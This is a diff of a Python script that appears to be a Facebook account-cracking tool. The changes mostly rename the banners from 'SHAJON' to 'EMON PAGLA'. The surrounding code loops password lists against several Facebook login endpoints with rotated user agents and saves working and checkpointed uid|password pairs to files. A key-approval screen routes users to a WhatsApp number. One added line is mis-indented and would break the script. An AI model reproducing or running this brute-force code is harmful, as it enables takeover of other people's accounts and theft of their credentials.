@@ -467,9 +467,15 @@ logo =f'''
 \033[1;93m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;93m
 
 
-{GREEN}╔═╗┌┬┐┌─┐┌┐┌  ┌─┐┌─┐┌─┐┬  ┌─┐
-{RED}║╣ ││││ ││││  ├─┘├─┤│ ┬│  ├─┤
-{GREEN}╚═╝┴ ┴└─┘┘└┘  ┴  ┴ ┴└─┘┴─┘┴ ┴
+
+ {GREEN}███████╗███╗   ███╗ ██████╗ ███╗   ██╗    ██████╗  █████╗  ██████╗ ██╗      █████╗ 
+  {GREEN}██╔════╝████╗ ████║██╔═══██╗████╗  ██║    ██╔══██╗██╔══██╗██╔════╝ ██║     ██╔══██╗
+ {RED}█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║    ██████╔╝███████║██║  ███╗██║     ███████║
+ {RED}██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║    ██╔═══╝ ██╔══██║██║   ██║██║     ██╔══██║
+ {GREEN}███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║    ██║     ██║  ██║╚██████╔╝███████╗██║  ██║
+ {GREEN}╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
+                                                                                   
+
                                     
                                     
 \033[1;91m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
@@ -713,6 +719,8 @@ def setting():
 def passwrd():
     os.system('clear')
     print(logo)
+    print('\033[1;92m[\033[1;91m•\033[1;92m]\033[1;95m STARTING TIME : \033[1;92m' + str(rtime))
+        print('\033[1;92m[\033[1;91m•\033[1;92m]\033[1;95m TODAY DATE : \033[1;92m' + str(now.date()))
     print(f"\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mUSER NAME\033[1;91m    \033[0;97m:\033[38;5;208m "+uname)
     print('\033[1;31m[\033[1;37m+\033[1;31m] \033[1;92mYOUR TOTAL UID  \033[0;97m:\033[1;96m', str(len(id)))
     print(f'\033[1;31m[\033[1;37m+\033[1;31m]\033[1;92m TURN \033[1;37m[\033[1;92mON\033[1;31m/\033[1;92mOFF\033[1;37m]\033[1;92m AIRPLANE MODE EVERY 5 MIN')
@@ -806,7 +814,7 @@ def login(uid):
     global oks,loop
     Session=requests.session()
     try:
-        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mSHAJON\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
+        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46mEMON🌺PAGLA\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
         sys.stdout.flush()
         ual = random.choice(user_agents)
         ual = random.choice(uadef)
@@ -846,7 +854,7 @@ def login(uid):
 def crack(idf, pwv):
     global loop, ok, cp, cps, oks
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mSHAJON•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M1\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua = random.choice(ugen2)
@@ -917,7 +925,7 @@ def crack(idf, pwv):
 def crackfree(idf, pwv):
     global loop, ok, cp, cps, oks
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mSHAJON•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M2\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua = random.choice(ugen2)
@@ -996,7 +1004,7 @@ def crackfree(idf, pwv):
 def cracktouch(idf, pwv):
     global cp, ok, loop
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mSHAJON•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M3\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua = random.choice(ugen2)
@@ -1073,7 +1081,7 @@ def cracktouch(idf, pwv):
 def crackhost(idf, pwv):
     global cp, ok, loop
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f"\r\033[1;31m[\033[1;37mSHAJON•M4\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
+    sys.stdout.write(f"\r\033[1;31m[\033[1;37mEMON PAGLA 🍬•M4\033[1;31m]{P}-\033[1;31m[{bo}{loop}\033[1;31m]-[{H}{len(id)}\033[1;31m]\033[1;37m-\033[1;31m[{H}OK•{H}{ok}\033[1;31m/{H}CP•{H}{cp}\033[1;31m] [{P}{'{:.0%}'.format(loop/float(len(id)))}\033[1;31m]\033[0;37m ")
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(uadef)
@@ -1160,7 +1168,7 @@ def rndm1(uid, passlist):
     global proxy
     global ugen
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f'\r\r{B}[{G}Emon Pagla-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+    sys.stdout.write(f'\r\r{B}[{G} EMON PAGLA 🍬-M1{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -1254,7 +1262,7 @@ def rndm2(uid, passlist):
     global cps
     global proxy
     bo = random.choice([m, k, h, b, u, x])
-    sys.stdout.write(f'\r\r{B}[{G}SHAJON-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+    sys.stdout.write(f'\r\r{B}[{G}EMON PAGLA 🍬-M2{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
     sys.stdout.flush()
     try:
         for pas in passlist:
@@ -1348,7 +1356,7 @@ def rndm3(uid, passlist):
             uax = random.choice(uadef)
             session = requests.Session()
             bo = random.choice([m, k, h, b, u, x])
-            sys.stdout.write(f'\r\r[{G}Emon Pagla-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
             sys.stdout.flush()
             fb = "m"
             free_fb = session.get(f'https://{fb}.facebook.com').text
@@ -1407,12 +1415,12 @@ def rndm3(uid, passlist):
                 break
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in lo:
-                    print(f'\r\033[38;5;45m[𝚂𝙷𝙰𝙹𝙾𝙽--𝟸𝙵] {uid} [💙] {pas} ')
+                    print(f'\r\033[38;5;45m[Emon-𝟸𝙵] {uid} [💙] {pas} ')
                     with open('/sdcard/-𝟸𝙵💙.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 else:
-                    print(f'\r\033[1;30m[SHAJON--CP] {uid} [💔] {pas} ')
+                    print(f'\r\033[1;30m[Emon--CP] {uid} [💔] {pas} ')
                     with open('/sdcard/--𝙲𝙿💔.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
@@ -1427,7 +1435,7 @@ def rndm3(uid, passlist):
 #______________#
 """def rndm3(uid, passlist):
     global oks, cps, ugen, loop
-    sys.stdout.write(f'\r\r[{G}SHAJON-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+    sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M3{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
     sys.stdout.flush()
     session = requests.Session()
     try:
@@ -1495,7 +1503,7 @@ def rndm3(uid, passlist):
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
                 else:
-                    print(f'\r\033[1;30m[SHAJON--CP] {uid} | {pas} ')
+                    print(f'\r\033[1;30m[Emon--CP] {uid} | {pas} ')
                     with open('/sdcard/--𝙲𝙿🥺💔.txt', 'a') as f:
                         f.write(uid + ' | ' + pas + '\n')
                     cps.append(uid)
@@ -1522,7 +1530,7 @@ def rndm4(uid, passlist):
             uax = random.choice(uadef)
             session = requests.Session()
             bo = random.choice([m, k, h, b, u, x])
-            sys.stdout.write(f'\r\r[{G}Emon-M4{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M4{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
             sys.stdout.flush()
             free_fb = session.get('https://web.facebook.com').text
             log_data = {
@@ -1603,7 +1611,7 @@ def rndm5(uid, passlist):
             uax = random.choice(uadef)
             session = requests.Session()
             bo = random.choice([m, k, h, b, u, x])
-            sys.stdout.write(f'\r\r[{G}Emon-M5{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
+            sys.stdout.write(f'\r\r[{G}EMON PAGLA 🍬-M5{B}]{G}-{B}[{bo}%s{B}]{G}-{B}[{G}OK•%s{M1}/{G}CP•{G}%s{B}] ' % (loop, len(oks), len(cps)))
             sys.stdout.flush()
             free_fb = session.get('https://p.facebook.com').text
             log_data = {
@@ -1699,11 +1707,11 @@ def approval():
         os.system("clear")
         print(logo)
         time.sleep(1)
-        print("\033[1;91m--> NOT WARKING ❌")
+        print("\033[1;91m--> YOUR KEY 🗝️ WARKING ❌")
         time.sleep(2)
-        print("\033[1;92m--> +8801867850909.....✅")
+        print("\033[1;92m--> wtup+8801867850909.....✅")
         jalan('  \033[1;95m═══════════════════════════════════════════════════')
-        print("\033[1;91m-->\033[1;32m 𝖄𝖔𝖚𝖗 𝕶𝖊𝖞: " + key)
+        print("\033[1;91m-->\033[1;32m KEY 🗝️: " + key)
         jalan('  \033[1;95m═══════════════════════════════════════════════════')
         input("\033[1;31m-->\033[1;32m𝙋𝙧𝙚𝙨𝙨 𝙀𝙣𝙩𝙚𝙧 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙠𝙚𝙮 𝙖𝙙𝙢𝙞𝙣...✅")
         os.system("xdg-open 'https://wa.me/+8801867850909'")
